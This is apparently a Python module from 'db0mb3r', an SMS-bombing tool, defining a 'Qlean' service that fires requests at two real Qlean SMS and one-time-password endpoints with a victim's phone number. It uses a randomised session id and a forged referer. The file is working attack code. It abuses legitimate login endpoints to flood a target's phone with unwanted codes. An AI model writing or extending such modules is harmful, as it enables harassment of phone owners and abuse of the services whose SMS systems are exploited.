from random import randint

from db0mb3r.services.service import Service


class Qlean(Service):
    async def run(self):
        await self.post(
            "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
            json={"phone": self.formatted_phone},
        )
        await self.get(
            "https://sso.cloud.qlean.ru/http/users/requestotp",
            headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
            params={
                "phone": self.formatted_phone,
                "clientId": "undefined",
                "sessionId": str(randint(5000, 9999)),
            },
        )
